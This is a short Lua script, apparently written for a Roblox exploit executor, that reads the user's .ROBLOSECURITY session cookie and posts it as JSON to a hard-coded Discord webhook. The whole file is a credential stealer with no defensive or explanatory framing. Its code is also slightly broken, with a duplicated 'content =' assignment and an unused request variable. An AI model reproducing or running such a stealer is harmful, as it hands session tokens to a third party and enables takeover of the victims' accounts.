local req = (syn and syn.request) or (http and http.request) or request
syn.request({
    Url = "	https://discord.com/api/webhooks/1498799691339534376/H9y-NbImUUzliq3t-QjCQUExg3-NYPg7SUADxU_sfSMWqrrsIbhKW530e042gtA61wRs",
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = game:GetService("HttpService"):JSONEncode({
        content = content = tostring(getcookies()[".ROBLOSECURITY"])
    })
})
